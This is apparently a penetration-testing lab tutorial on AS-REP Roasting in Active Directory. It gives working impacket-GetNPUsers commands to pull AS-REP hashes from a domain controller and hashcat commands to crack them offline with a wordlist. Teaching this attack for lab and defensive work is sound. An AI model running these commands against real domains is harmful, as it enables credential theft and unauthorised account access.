AS-REP Roasting
The first step of the authentication process via Kerberos is to send an AS-REQ. 
Based on this request, the DC can validate if authentication is successful. 
If it is, the domain controller replies with an AS-REP containing the session key and TGT. 
This step is also commonly referred to as Kerberos preauthentication and prevents offline password guessing.

Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the DC on behalf of any AD user. 
After obtaining the AS-REP from the DC, you can perform an offline password attack against the encrypted part of the response.
This attack is known as AS-REP Roasting.
 
 By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. 
 However, it is possible to enable this account option manually. 

Let's perform this attack from our Kali machine first, then on Windows. 
On Kali, we can use impacket-GetNPUsers to perform AS-REP roasting. 
We'll need to enter the IP address of the DC as an argument for -dc-ip, the name of the output file in which the AS-REP hash will be stored in Hashcat format for -outputfile, and -request to request the TGT.

Finally, we need to specify the target authentication information in the format domain/user, this is the user we use for authentication. 
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/mute

Using GetNPUsers to perform AS-REP roasting
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/mute

muted has the user account option Do not require Kerberos preauthentication enabled, meaning it's vulnerable to AS-REP Roasting.

Obtaining the correct mode for Hashcat
By default, the resulting hash format of impacket-GetNPUsers is compatible with Hashcat. 
Check the correct mode for the AS-REP hash by grepping for "Kerberos" in the Hashcat help.

kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
   
The output of the grep command shows that the correct mode for AS-REP is 18200.

We've now collected everything we need to launch Hashcat and crack the AS-REP hash. 
Let's enter the mode 18200, the file containing the AS-REP hash, rockyou.txt as wordlist, best64.rule as rule file, and --force to perform the cracking on our Kali VM.

kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
